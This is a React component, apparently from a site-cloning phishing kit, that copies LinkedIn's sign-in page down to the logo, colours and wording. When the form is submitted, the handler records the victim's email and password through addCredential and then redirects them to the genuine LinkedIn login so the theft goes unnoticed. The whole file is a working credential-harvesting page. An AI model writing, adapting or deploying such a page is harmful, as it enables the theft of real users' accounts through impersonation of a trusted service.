'use client';
import { useState } from 'react';
import { useClones } from '@/hooks/use-clones';
import type { Clone } from '@/lib/types';

const LinkedInLogo = () => (
    <svg xmlns="http://www.w3.org/2000/svg" width="140" height="35" viewBox="0 0 118 28" className="text-[#0a66c2] fill-current">
        <path d="M117.2 27.5V.5h-9.5v27zM52.3 14c0-3.9-2.5-6.9-6.4-6.9-4.1 0-6.5 2.8-6.5 6.9 0 3.9 2.5 6.9 6.5 6.9 3.9.1 6.4-3 6.4-6.9zm-9.3 0c0-2.3.9-4.3 3-4.3s2.9 2 2.9 4.3c0 2.3-1 4.3-3 4.3s-2.9-2-2.9-4.3zM70.9 27.5V7.6h-9.5v2.3h.2c-.6-1.1-3.2-2.6-8.2-2.6-6.1 0-9.7 3.6-9.7 9.8v10.4h9.5V18.1c0-2.3.6-5.3 4.3-5.3 3.3 0 3.8 2.8 3.8 5.3v9.4zM90.3 7.6h-9.5v2.3h.2c-.9-1.3-3.1-2.6-8.1-2.6-5.8 0-10 3.8-10 10V27.5h9.5V18.1c0-2.8.8-5.3 4.3-5.3 2.9 0 3.9 2.1 3.9 5.3v9.4h9.5V7.6zM26.4 7.6h-9.5v19.9h9.5zM21.7 0c-2.8 0-4.7 1.9-4.7 4.3s1.9 4.3 4.6 4.3 4.7-1.9 4.7-4.3-1.8-4.3-4.6-4.3zM107.5 7.3c-4.8 0-7.8 2.5-7.8 5.7h.2c.8-1.1 2.5-2.1 4.7-2.1 3.8 0 5.9 2.3 5.9 7.2v9.4h9.5V17.8c0-5.8-3.1-10.5-12-10.5zm-2.8 13.1c0-2.2-.8-3.6-2.5-3.6s-2.6 1.4-2.6 3.6v.1h5.1z"></path>
    </svg>
)

export default function LinkedinPage({ clone }: { clone: Clone }) {
  const { addCredential } = useClones();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (email) {
      addCredential(clone.id, { username: email, password });
    }
    window.location.href = 'https://www.linkedin.com/login';
  };

  return (
    <div className="bg-gray-100 min-h-screen flex flex-col items-center pt-12 font-sans">
       <div className="mb-6">
        <LinkedInLogo />
       </div>
       <div className="w-full max-w-sm">
         <div className="bg-white p-8 rounded-lg shadow-md">
            <h1 className="text-3xl font-semibold mb-2">Sign in</h1>
            <p className="text-gray-600 mb-6">Stay updated on your professional world</p>
            <form onSubmit={handleSubmit} className="space-y-5">
                <div>
                <input
                    type="text"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email or Phone"
                    className="w-full px-4 py-3 border border-gray-700 rounded-md focus:outline-none focus:ring-1 focus:ring-black"
                    required
                />
                </div>
                <div>
                <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="w-full px-4 py-3 border border-gray-700 rounded-md focus:outline-none focus:ring-1 focus:ring-black"
                />
                </div>
                 <a href="#" className="text-sm text-[#0a66c2] font-semibold hover:underline">
                    Forgot password?
                </a>
                <button
                type="submit"
                className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-bold text-lg hover:bg-[#004182] transition-colors"
                >
                Sign in
                </button>
            </form>
         </div>
         <p className="text-center mt-6">
            New to LinkedIn? <a href="#" className="text-[#0a66c2] font-bold hover:underline">Join now</a>
         </p>
       </div>
    </div>
  );
}
